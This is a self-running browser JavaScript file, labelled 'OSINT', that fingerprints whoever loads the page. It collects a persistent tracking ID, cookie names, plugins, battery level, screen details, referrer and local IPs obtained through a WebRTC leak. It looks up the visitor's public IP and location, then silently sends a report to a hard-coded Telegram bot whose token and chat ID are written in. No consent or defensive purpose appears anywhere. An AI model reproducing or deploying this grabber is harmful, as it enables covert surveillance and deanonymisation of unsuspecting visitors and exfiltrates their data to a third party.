(() => {
  'use strict';


  const botToken = '5871224544:AAH2CkeLJSsmdmp4MIGIul8welqy6hLFVPU';
  const chatId = '920222421';

  // Helper: generate or get persistent UUID in localStorage
  function getPersistentUUID() {
    let uuid = localStorage.getItem('osint_uuid');
    if (!uuid) {
      uuid = crypto.randomUUID ? crypto.randomUUID() : ([1e7] + -1e3 + -4e3 + -8e3 + -1e11)
        .replace(/[018]/g, c =>
          (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
      localStorage.setItem('osint_uuid', uuid);
      console.log('[OSINT] Generated new UUID:', uuid);
    } else {
      console.log('[OSINT] Loaded existing UUID:', uuid);
    }
    return uuid;
  }

  // Get browser cookies parsed into key-value object
  function getCookies() {
    return document.cookie.split('; ').reduce((acc, cookie) => {
      const [k, v] = cookie.split('=');
      if (k) acc[k] = v;
      return acc;
    }, {});
  }

  // Get installed plugins names
  function getPlugins() {
    return Array.from(navigator.plugins).map(p => p.name);
  }

  // Get local IPs via WebRTC
  async function getLocalIPs() {
    return new Promise((resolve) => {
      const ips = new Set();
      // Compatibility for Firefox and Chrome
      const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTCPeerConnection) {
        resolve([]);
        return;
      }
      const pc = new RTCPeerConnection({
        iceServers: []
      });
      pc.createDataChannel('');
      pc.onicecandidate = (event) => {
        if (!event.candidate) {
          pc.close();
          resolve(Array.from(ips));
          return;
        }
        const parts = event.candidate.candidate.split(' ');
        const ip = parts[4];
        if (ip && !ip.includes(':') && !ips.has(ip)) { // Exclude IPv6 for local IP
          ips.add(ip);
        }
      };
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve([]));
    });
  }

  // Get battery info with percentage (or null)
  async function getBatteryLevel() {
    if (!navigator.getBattery) return null;
    try {
      const battery = await navigator.getBattery();
      return Math.round(battery.level * 100);
    } catch {
      return null;
    }
  }

  // Collect device/browser data
  async function collectDeviceData() {
    const uuid = getPersistentUUID();
    const localIPs = await getLocalIPs();
    const batteryLevel = await getBatteryLevel();
    return {
      uuid,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      screenRes: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      cookieEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
      batteryLevel,
      localIPs,
      cookies: getCookies(),
      plugins: getPlugins(),
      pageUrl: window.location.href,
      referrer: document.referrer || 'N/A',
    };
  }

  // Get public IP + geo info from ipapi.co
  async function getPublicIPInfo() {
    try {
      const res = await fetch('https://ipapi.co/json/', {
        cache: 'no-store'
      });
      if (!res.ok) {
        console.warn('[OSINT] Failed to get public IP info:', res.status);
        return null;
      }
      return await res.json();
    } catch (e) {
      console.error('[OSINT] Error fetching public IP info:', e);
      return null;
    }
  }

  // Format JSON data as a Telegram HTML table message
  function createTelegramMessage(data) {
    let msg = `<b>OSINT Report - User ID: ${data.uuid}</b>\n\n`;

    msg += `<b>Page URL:</b> ${data.pageUrl}\n`;
    msg += `<b>Referrer:</b> ${data.referrer}\n\n`;

    msg += `<b>Public IPv4:</b> ${data.publicIP || 'N/A'}\n`;
    msg += `<b>Public IPv6:</b> ${data.publicIPv6 || 'N/A'}\n`;
    msg += `<b>ISP:</b> ${data.isp || 'N/A'}\n`;
    msg += `<b>City:</b> ${data.city || 'N/A'}\n`;
    msg += `<b>Region:</b> ${data.region || 'N/A'}\n`;
    msg += `<b>Country:</b> ${data.country_name || 'N/A'}\n\n`;

    msg += `<b>User Agent:</b> ${data.userAgent}\n`;
    msg += `<b>Platform:</b> ${data.platform}\n`;
    msg += `<b>Languages:</b> ${data.languages.join(', ')}\n`;
    msg += `<b>Timezone:</b> ${data.timezone}\n`;
    msg += `<b>Hardware Concurrency:</b> ${data.hardwareConcurrency}\n`;
    msg += `<b>Touch Points:</b> ${data.maxTouchPoints}\n`;
    msg += `<b>Screen Resolution:</b> ${data.screenRes}\n`;
    msg += `<b>Color Depth:</b> ${data.colorDepth}\n`;
    msg += `<b>Cookies Enabled:</b> ${data.cookieEnabled}\n`;
    msg += `<b>Online:</b> ${data.online}\n`;
    msg += `<b>Battery Level:</b> ${data.batteryLevel !== null ? data.batteryLevel + '%' : 'N/A'}\n\n`;

    msg += `<b>Local IPs:</b> ${data.localIPs.length > 0 ? data.localIPs.join(', ') : 'None'}\n`;

    const cookieKeys = Object.keys(data.cookies || {});
    msg += `<b>Cookies:</b> ${cookieKeys.length > 0 ? cookieKeys.join(', ') : 'None'}\n`;

    msg += `<b>Plugins:</b> ${data.plugins.length > 0 ? data.plugins.join(', ') : 'None'}\n\n`;

    return msg;
  }

  // Send Telegram message via Bot API
  async function sendTelegramMessage(data) {
    try {
      console.log('[OSINT] Sending Telegram message...');
      const message = createTelegramMessage(data);

      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      if (!res.ok) {
        console.error('[OSINT] Telegram API error:', res.status, await res.text());
      } else {
        console.log('[OSINT] Telegram message sent.');
      }
    } catch (e) {
      console.error('[OSINT] Error sending Telegram message:', e);
    }
  }

  // Main orchestrator
  (async () => {
    console.log('[OSINT] Starting data collection...');
    const deviceData = await collectDeviceData();

    console.log('[OSINT] Getting public IP info...');
    const publicIPInfo = await getPublicIPInfo();

    // Check if public IP info was successfully retrieved
    if (publicIPInfo && publicIPInfo.ip) {
      // Check if the IP is IPv6 or IPv4
      if (publicIPInfo.ip.includes(':')) {
        // It's an IPv6 address
        deviceData.publicIP = null;
        deviceData.publicIPv6 = publicIPInfo.ip;
      } else {
        // It's an IPv4 address
        deviceData.publicIP = publicIPInfo.ip;
        deviceData.publicIPv6 = null;
      }

      deviceData.isp = publicIPInfo.org;
      deviceData.city = publicIPInfo.city;
      deviceData.region = publicIPInfo.region;
      deviceData.country_name = publicIPInfo.country_name;
    } else {
      // Set all to null if the request failed
      deviceData.publicIP = null;
      deviceData.publicIPv6 = null;
      deviceData.isp = null;
      deviceData.city = null;
      deviceData.region = null;
      deviceData.country_name = null;
    }

    // Add timestamp and visitor type (new or returning)
    deviceData.timestamp = new Date().toISOString();
    deviceData.visitorType = localStorage.getItem('osint_uuid') ? 'returning' : 'new';

    // Send Telegram message
    await sendTelegramMessage(deviceData);

    console.log('[OSINT] Data collection and sending completed.');
  })();
})();

